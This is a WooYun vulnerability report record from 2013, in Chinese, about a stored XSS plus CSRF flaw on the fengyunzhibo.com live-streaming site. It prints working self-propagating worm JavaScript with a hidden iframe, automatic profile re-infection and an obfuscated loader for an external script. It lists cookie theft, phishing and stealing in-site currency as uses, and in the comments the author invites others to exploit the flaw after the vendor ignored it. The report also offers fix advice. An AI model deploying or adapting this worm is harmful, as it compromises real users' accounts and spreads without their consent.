{"id": 7676, "wybug_id": "wooyun-2013-044666", "wybug_title": "风云直播利用某xss可以形成蠕虫的例子", "wybug_corp": "风云直播", "wybug_author": "无尘", "wybug_date": "2013-12-02 13:15", "wybug_open_date": "2013-12-07 13:16", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "类型应用", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 利用站内的XSS漏洞，结合站内信CSRF进行蠕虫式传播。 详细说明：  此方法特点：1、可XSS+CSRF形成持久蠕虫，可通过编码强制修改用户操作。因modify.html被影响，所以可拦截被感染用户操作。2、盗用cookie，钓用户，直接偷金矿，甚至可以形成定向攻击。比如通过http://gm.fengyunzhibo.com/gamble/ 找到需要黑的土豪。（尽快隐蔽起来吧）3、引用外部JS文件，让所有操作都成为可能。通过个人信息中XSS，配合修改个人资料的CSRF可编码蠕虫。因站内类似问题较多，可利用多种方式组合实现蠕虫功能。 （当前触发测试的仅在用户信息页面）4、不可小视，形成一定的量后，挂广告应该是笔不错的收益。简单说下原理流程：1、通过个人信息的头像字段进行XSS。http://user.fengyunzhibo.com/modify.htm 我的例子中没有做太多的兼容，有心的话可以不同输出页面的兼容，让用户无法发掘被植入了非安全代码。请求原型：\n$.ajax({\t\turl:\"http://user.fengyunzhibo.com/usermanager\",\t\ttype:\"post\",\t\tdata:{\t\t\top:\"uname\",\t\t\tid:\"1419428\",\t\t\tdata:\"{uname:'无尘_xx',figureurl:'http://www.soso.com/soso/images/logo_index.png\\\" id=user-avatar /><img src=a onerror=$(this).hide().attr(\\\"id\\\",\\\"xyz\\\");alert(String.fromCharCode(104,116,116,112,58,47,47,98,108,111,103,46,115,101,108,97,110,103,115,104,105,119,111,46,99,111,109)) a=\\\"',location:'北京 东城',signature:'helloKitty',gender:'1'}\"\t\t}\t});\n为了不对原始输出造成可察觉影响，其中补完了原始URL地址后，后面用<img >的onerror触发脚本。（兼容代码）2、这里是高潮，为了解决跨域问题，满足触发条件后，隐藏打开iframe跳转至被感染user.fengyunzhibo.com域下的页面，通过modify.htm页面获取待被感染用户的信息，构建请求完成感染。以下仅实现了部分功能，作为样例。\n(function(){\t/*cookie辅助*/\t$.cookie = function(n,v){\t\tvar c = document.cookie ;\t\tif(n&&!v){\t\t\tvar cs = c.indexOf(n+\"=\");\t\t\tif(cs!=-1){\t\t\t\tcs += n.length + 1;\t\t\t\tce = c.indexOf(\";\",cs);\t\t\t\tif(ce==-1)\t\t\t\t\tce=c.length;\t\t\t\treturn unescape(c.substring(cs,ce));\t\t\t}\t\t\treturn null ;\t\t}\t\t\t\tif(n&&v){\t\t\tdocument.cookie=n+\"=\"+escape(v) ;\t\t}\t};\t\tif($.cookie(\"u\")){\t\tif($(\"#w_uinfo\")[0]==undefined){\t\t\t$(\"body\").append(\"<iframe id='w_uinfo' style='display:none'></iframe>\");\t\t\t$(\"#w_uinfo\").load(function(){\t\t\t\t//发送请求前,需要检查url是否已被利用,不重复发起.\t\t\t\tvar uInfoFrame = $(\"#w_uinfo\").contents() ;\t\t\t\t//console.log(uInfoFrame.find(\"#uname-input\").val().trim());\t\t\t\t//console.log(uInfoFrame.find(\"#def\").attr(\"src\"));\t\t\t\t//console.log(uInfoFrame.find('input[name=\"sex\"]:checked').val());\t\t\t\t//console.log(uInfoFrame.find(\"#ddlProvince\").val()+\" \"+uInfoFrame.find(\"#ddlCity\").val());\t\t\t\t//console.log(uInfoFrame.find(\".signature-input\").text());\t\t\t\t\t\t\t\t$.ajax({\t\t\t\t\turl:\"http://user.fengyunzhibo.com/usermanager\",\t\t\t\t\ttype:\"post\",\t\t\t\t\tdata:{\t\t\t\t\t\top:\"uname\",\t\t\t\t\t\tid:$.cookie(\"u\"),\t\t\t\t\t\tdata:\"{'uname':'\"+uInfoFrame.find(\"#uname-input\").val().trim()+\"',\"\t\t\t\t\t\t\t\t+\"'figureurl':'\"+uInfoFrame.find(\"#def\").attr(\"src\")+\"\"\t\t\t\t\t\t\t\t+\"\\\" id=user-avatar /><img src=a onerror=$(this).hide().attr(\\\"id\\\",\\\"xyz\\\");window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,115,101,108,97,110,103,115,104,105,119,111,46,99,111,109,47,97,100,47,97,100,95,121,117,110,103,102,101,110,103,122,104,105,98,111,46,106,115);document.body.appendChild(window.s) a=\\\"\"\t\t\t\t\t\t\t\t+\"',\"\t\t\t\t\t\t\t\t+\"'location':'\"+uInfoFrame.find(\"#ddlProvince\").val()+\" \"+uInfoFrame.find(\"#ddlCity\").val()+\"',\"\t\t\t\t\t\t\t\t+\"'signature':'\"+uInfoFrame.find(\".signature-input\").text()+\"','gender':'\"+uInfoFrame.find('input[name=\"sex\"]:checked').val()+\"'}\"\t\t\t\t\t},\t\t\t\t\tsuccess:function(r){\t\t\t\t\t\tif(r == \"ok\"){\t\t\t\t\t\t\talert(\"感染成功\");\t\t\t\t\t\t\t$.cookie(\"xyz\"+$.cookie(\"u\"):\"822696\");\t\t\t\t\t\t}\t\t\t\t\t}\t\t\t\t});\t\t\t});\t\t\t$(\"#w_uinfo\").attr(\"src\",\"http://user.fengyunzhibo.com/modify.htm\");\t\t}\t}})();\n3、感染后，可通过远程脚本构建其他功能。   漏洞证明：  以下截图用于证明脚本正常触发，具体功能参照详细描述。信息卡页面：http://user.fengyunzhibo.com/home.htm?uid=1419428\n\n个人信息修改页面：http://user.fengyunzhibo.com/modify.htm\n\n   修复方案：  最简单的方法，在录入用户信息时，增加过滤。最妥当的方法，录入信息增加过滤后，对所有输出内容进行二次过滤。另外查找站内其他的CSRF，进行修改，我记得之前跟你们发了一个邮件，是关于抽奖的CSRF的。http://forum.fengyunzhibo.com:9002/forum.php?mod=viewthread&tid=1807&extra=这种问题虽然表面影响不大，但会在特殊情况下造成很严重的问题。如果我的蠕虫里带有自动抽奖的脚本，后果你懂的。因为是你们节目的老星际粉，技术问题全力支持，可直接联系我。联系方式：曾经给 249398279@QQ.com 发过一封邮件关于抽奖的，标题《抽奖的CSRF BUG》，时间 2013年10月14日(星期一) 上午9:16   版权声明：转载请注明来源 无尘@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-07 13:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-03 17:44 |    \t\t蓝盾科技 \t\t\t( 实习白帽子  |\t\t\t        Rank:90 漏洞数:16        | 蓝盾科技致力于网络安全，信息安全，通信安...)\t\t \n  无尘哥 加油啊·希望以后还能看到你    \n     2013-12-08 20:14 |    \t\t无尘 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | Nan.)\t\t \n  被忽略了，大家可以疯狂一下了。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}